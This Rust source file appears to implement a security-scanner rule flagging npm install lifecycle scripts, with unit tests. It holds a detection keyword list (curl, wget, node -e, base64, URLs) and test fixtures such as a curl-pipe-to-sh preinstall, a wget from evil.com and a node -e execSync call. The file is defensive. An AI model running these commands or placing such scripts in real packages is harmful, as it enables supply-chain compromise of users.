//! `PKG001-install-script-present` — flags `package.json` lifecycle scripts
//! that run during installation or publishing.
//!
//! Install scripts (`preinstall`, `install`, `postinstall`, `prepublish`) run
//! automatically when a consumer installs the package. Presence alone is
//! suspicious and earns a Medium finding; script bodies that contain network
//! fetchers (`curl`, `wget`), inline node execution (`node -e`), base64 decode
//! patterns, or bare HTTP(S) URLs are escalated to High because they indicate
//! a phone-home or dropper pattern.

use zuit_core::span::{ByteOffset, LineCol, Location, Span};
use zuit_core::{
    AnalysisContext, Analyzer, AnalyzerId, AnalyzerKind, Dimension, Finding, ParsedFile, Project,
    RuleMeta, Severity, SupportedLanguages,
};

/// Rule ID for the install-script check.
const RULE_ID: &str = "PKG001-install-script-present";

/// Static metadata for this rule.
const META: RuleMeta = RuleMeta {
    id: RULE_ID,
    default_severity: Severity::Medium,
    doc_path: "docs/rules/PKG001-install-script-present.md",
    cwe: &["CWE-506"],
    owasp: &[],
};

/// Script names that run during `npm install` or `npm publish`.
const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepublish"];

/// Returns `true` when the script body contains a suspicious pattern that
/// warrants escalation to High severity.
fn is_high_risk(body: &str) -> bool {
    let lower = body.to_lowercase();
    lower.contains("curl ")
        || lower.contains("wget ")
        || lower.contains("node -e")
        || lower.contains("base64")
        || lower.contains("http://")
        || lower.contains("https://")
}

/// Zero-width location anchored at `package.json` line 1, column 1.
fn pkg_json_location(root: &std::path::Path) -> Location {
    let zero = Span::new(ByteOffset(0), ByteOffset(0));
    Location {
        file: root.join("package.json"),
        span: zero,
        start: LineCol::new(1, 1),
        end: LineCol::new(1, 1),
    }
}

/// Analyzer that emits `PKG001-install-script-present` when `package.json`
/// declares lifecycle scripts that run on installation or publishing.
pub struct Pkg001InstallScriptAnalyzer;

impl Analyzer for Pkg001InstallScriptAnalyzer {
    fn id(&self) -> AnalyzerId {
        AnalyzerId::new(RULE_ID)
    }

    fn dimension(&self) -> Dimension {
        Dimension::Security
    }

    fn supported_languages(&self) -> SupportedLanguages {
        SupportedLanguages::All
    }

    fn rules(&self) -> &[RuleMeta] {
        std::slice::from_ref(&META)
    }

    fn kind(&self) -> AnalyzerKind {
        AnalyzerKind::ProjectLevel
    }

    fn analyze_file(&self, _ctx: &AnalysisContext<'_>, _file: &ParsedFile) -> Vec<Finding> {
        vec![]
    }

    fn analyze_project(&self, _ctx: &AnalysisContext<'_>, project: &Project) -> Vec<Finding> {
        let manifest = crate::manifest::get_or_load(&project.root);
        let Some(pkg) = manifest.package_json.as_ref() else {
            return vec![];
        };

        let Some(scripts) = pkg.get("scripts").and_then(|s| s.as_object()) else {
            return vec![];
        };

        let mut findings = Vec::new();
        for &hook in INSTALL_HOOKS {
            if let Some(body_val) = scripts.get(hook) {
                let body = body_val.as_str().unwrap_or_default();
                let severity = if is_high_risk(body) {
                    Severity::High
                } else {
                    Severity::Medium
                };
                findings.push(Finding {
                    analyzer: AnalyzerId::new(RULE_ID),
                    dimension: Dimension::Security,
                    rule_id: RULE_ID.to_string(),
                    severity,
                    message: format!(
                        "install lifecycle script `{hook}` detected in package.json; \
                         scripts run automatically during `npm install`"
                    ),
                    location: pkg_json_location(&project.root),
                    suggestion: Some(
                        "Remove the install script or verify its body performs no \
                         network fetches or arbitrary code execution."
                            .to_string(),
                    ),
                    references: vec!["https://cwe.mitre.org/data/definitions/506.html".to_string()],
                    cwe: META.cwe_vec(),
                    owasp: META.owasp_vec(),
                });
            }
        }
        findings
    }
}

// ── tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use zuit_core::{Config, Project};
    use tempfile::TempDir;

    fn write(dir: &std::path::Path, name: &str, content: &str) {
        std::fs::write(dir.join(name), content).expect("invariant: temp dir is writable");
    }

    fn run(dir: &std::path::Path) -> Vec<Finding> {
        let config = Config::default();
        let ctx = AnalysisContext::new(&config);
        let project = Project::new(dir.to_path_buf(), vec![]);
        Pkg001InstallScriptAnalyzer.analyze_project(&ctx, &project)
    }

    #[test]
    fn postinstall_script_emits_one_medium() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"node setup.js"}}"#,
        );
        let findings = run(dir.path());
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].rule_id, RULE_ID);
        assert_eq!(findings[0].location.file, dir.path().join("package.json"));
    }

    #[test]
    fn curl_in_script_body_emits_high() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"preinstall":"curl https://example.com | sh"}}"#,
        );
        let findings = run(dir.path());
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn wget_in_script_body_emits_high() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"wget https://evil.com/payload"}}"#,
        );
        let findings = run(dir.path());
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn node_e_in_script_body_emits_high() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"node -e \"require('child_process').execSync('id')\""}}"#,
        );
        let findings = run(dir.path());
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn url_in_script_body_emits_high() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"install":"node fetch.js https://example.com/pkg"}}"#,
        );
        let findings = run(dir.path());
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn no_install_script_emits_zero() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"build":"tsc","test":"jest"}}"#,
        );
        let findings = run(dir.path());
        assert!(findings.is_empty(), "got: {findings:#?}");
    }

    #[test]
    fn no_package_json_emits_zero() {
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        let findings = run(dir.path());
        assert!(findings.is_empty(), "got: {findings:#?}");
    }

    #[test]
    fn suppression_finding_is_present_json_has_no_inline_directive() {
        // JSON files have no comment syntax, so inline suppression is impossible.
        // The finding must be present and can only be suppressed via zuit.toml.
        crate::manifest::reset_for_tests();
        let dir = TempDir::new().expect("tempdir");
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"node setup.js"}}"#,
        );
        let findings = run(dir.path());
        assert_eq!(
            findings.len(),
            1,
            "finding must be present (no inline suppression in JSON)"
        );
    }
}
